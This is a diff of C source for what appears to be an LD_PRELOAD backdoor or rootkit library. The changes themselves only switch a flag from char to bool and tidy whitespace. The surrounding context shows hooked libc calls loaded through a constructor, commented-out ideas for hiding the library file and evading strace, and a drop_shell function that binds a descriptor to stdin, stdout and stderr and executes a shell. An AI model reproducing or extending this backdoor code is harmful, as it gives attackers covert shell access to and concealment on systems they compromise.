@@ -1,5 +1,5 @@
 #include <dlfcn.h>
-#include <stdlib.h>
+#include <stdbool.h>
 
 void init(void) __attribute__((constructor));
 void fini(void) __attribute__((destructor));
@@ -16,7 +16,7 @@ enum libcall_refs
 };
 
 const void *(*libcalls[N_LIBCALLS])();
-char lib_loaded = 1;    /* Non-constant global. Not my problem, bitch. (I'll come back for you later, my love.) */
+bool lib_loaded = true;    /* Non-constant global. Not my problem, bitch. (I'll come back for you later, my love.) */
 
 void init(void)
 {
@@ -42,7 +42,7 @@ void init(void)
             /* system("mv h0h0.so .h0h0.so"); */        /* Silly idea? */
             /* freopen("/dev/null", "w", stderr); */    /* {s,l}trace writes to stderr (try something else). */
 
-            lib_loaded = 0;
+            lib_loaded = false;
         }
     }
 
@@ -70,7 +70,7 @@ void drop_shell(int fd)
         dup2(fd, 0);
         dup2(fd, 1);
         dup2(fd, 2);
-    
+
         execve(argv[0], argv, envp);
     }
 }
